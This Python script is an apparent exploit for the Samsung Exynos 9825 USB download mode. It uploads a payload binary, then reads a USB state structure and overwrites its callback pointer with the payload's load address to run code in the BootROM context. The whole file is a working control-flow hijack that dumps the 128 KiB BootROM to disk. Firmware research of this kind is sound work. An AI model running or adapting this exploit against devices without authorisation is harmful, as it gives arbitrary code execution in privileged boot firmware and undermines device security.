#!/usr/bin/env python3

import struct
import hashlib
import os
import time
from pathlib import Path

import usb.core
import usb.util


VID = 0x04e8
PID = 0x1234

IFACE = 0
EP_OUT = 0x02
EP_IN = 0x81

RX_ADDR = 0x02022000
USB_STRUCT_OFF = 0x480

ROOT = Path(__file__).resolve().parents[1]

PAYLOAD = ROOT / "payloads/Exynos9825_dump_bootrom.bin"


def p32(v):
    return struct.pack("<I", v)


def u32(v):
    return struct.unpack("<I", v)[0]


def make_dnw(payload):
    block = bytearray(len(payload) + 10)

    block[0:4] = b"\x1bDNW"
    block[4:8] = p32(len(block) + 512)
    block[8:8 + len(payload)] = payload

    checksum = sum(block[8:-2]) & 0xffff
    block[-2:] = struct.pack("<H", checksum)

    return block


def wait_device():
    while True:
        d = usb.core.find(
            idVendor=VID,
            idProduct=PID,
        )

        if d is not None:
            return d

        time.sleep(0.005)


def claim(d):
    try:
        d.get_active_configuration()
    except usb.core.USBError:
        d.set_configuration()

    try:
        if d.is_kernel_driver_active(IFACE):
            d.detach_kernel_driver(IFACE)
    except (usb.core.USBError, NotImplementedError):
        pass

    usb.util.claim_interface(d, IFACE)


def main():
    if not PAYLOAD.exists():
        raise SystemExit(
            f"Payload not found: {PAYLOAD}\n"
            f"Build it first with: make -C {ROOT / 'payloads'}"
        )

    payload = PAYLOAD.read_bytes()
    block = make_dnw(payload)

    print("Exynos9825 BootROM dumper")
    print(f"payload = 0x{len(payload):x}")
    print()
    print("PRE-ARMED")
    print("Waiting for EUB...")

    d = wait_device()
    claim(d)

    print(
        f"EUB: bus={d.bus} address={d.address}"
    )

    print("Draining pre-existing EP1 IN data...")

    while True:
        try:
            stale = bytes(
                d.read(
                    EP_IN,
                    512,
                    timeout=100,
                )
            )

            if not stale:
                break

            print(
                f"stale IN: 0x{len(stale):x} bytes "
                f"{stale!r}"
            )

        except usb.core.USBTimeoutError:
            break

    print("EP1 IN drained.")

    n = d.write(
        EP_OUT,
        block,
        timeout=5000,
    )

    print(f"payload write = 0x{n:x}")

    size = USB_STRUCT_OFF + 0x14

    state = bytearray(
        d.ctrl_transfer(
            0x80,
            0x08,
            0,
            0,
            size,
            timeout=1000,
        )
    )

    events = u32(
        state[
            USB_STRUCT_OFF:
            USB_STRUCT_OFF + 4
        ]
    )

    callback = u32(
        state[
            USB_STRUCT_OFF + 0x10:
            USB_STRUCT_OFF + 0x14
        ]
    )

    print(f"events       = 0x{events:08x}")
    print(f"callback old = 0x{callback:08x}")

    state[
        USB_STRUCT_OFF:
        USB_STRUCT_OFF + 4
    ] = p32(events + 5)

    state[
        USB_STRUCT_OFF + 0x10:
        USB_STRUCT_OFF + 0x14
    ] = p32(RX_ADDR)

    print(
        f"callback new = 0x{RX_ADDR:08x}"
    )

    try:
        d.ctrl_transfer(
            0x00,
            0x08,
            0,
            0,
            state,
            timeout=250,
        )

        print("trigger returned")

    except usb.core.USBTimeoutError:
        print(
            "trigger timeout — expected if payload loops"
        )

    except usb.core.USBError as e:
        print(f"trigger USBError: {e}")

    print("Reading complete BootROM from EP1 IN...")

    target = 0x20000
    out = bytearray()

    while len(out) < target:
        remaining = target - len(out)
        request = min(0x4000, remaining)

        try:
            chunk = bytes(
                d.read(
                    EP_IN,
                    request,
                    timeout=3000,
                )
            )
        except usb.core.USBError as e:
            print()
            print(f"USB read failed after 0x{len(out):x}: {e}")
            break

        if not chunk:
            print()
            print("Zero-length read")
            break

        out.extend(chunk)

        print(
            f"\rreceived 0x{len(out):05x}/0x{target:05x}",
            end="",
            flush=True,
        )

    print()

    output = ROOT / "bootrom_exynos9825.bin"
    output.write_bytes(out)

    print()
    print("=== RESULT ===")
    print(f"received = 0x{len(out):x} ({len(out)} bytes)")
    print(f"saved    = {output}")

    if len(out) != target:
        print("INCOMPLETE DUMP")
        return

    print("SIZE OK: complete 128 KiB BootROM")

    digest = hashlib.sha256(out).hexdigest()

    print(f"SHA-256  = {digest}")

    # Avoid leaving a root-owned dump when run through sudo.
    sudo_uid = os.environ.get("SUDO_UID")
    sudo_gid = os.environ.get("SUDO_GID")

    if sudo_uid is not None and sudo_gid is not None:
        try:
            os.chown(
                output,
                int(sudo_uid),
                int(sudo_gid),
            )
        except OSError as e:
            print(f"warning: could not change output owner: {e}")


if __name__ == "__main__":
    main()
